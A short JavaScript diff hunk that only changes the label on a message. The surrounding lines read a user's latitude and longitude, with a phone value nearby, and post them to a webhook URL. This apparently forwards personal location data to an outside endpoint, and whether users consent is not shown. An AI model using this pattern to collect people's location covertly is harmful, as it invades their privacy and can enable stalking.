@@ -407,7 +407,7 @@ ${phone}`;
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
             const message = {
-                content: `User Coordinates:\nLatitude: ${latitude}\nLongitude: ${longitude}`
+                content: `------User Coordinates-------:\nLatitude: ${latitude}\nLongitude: ${longitude}`
             };
 
             fetch(webhookUrl, {
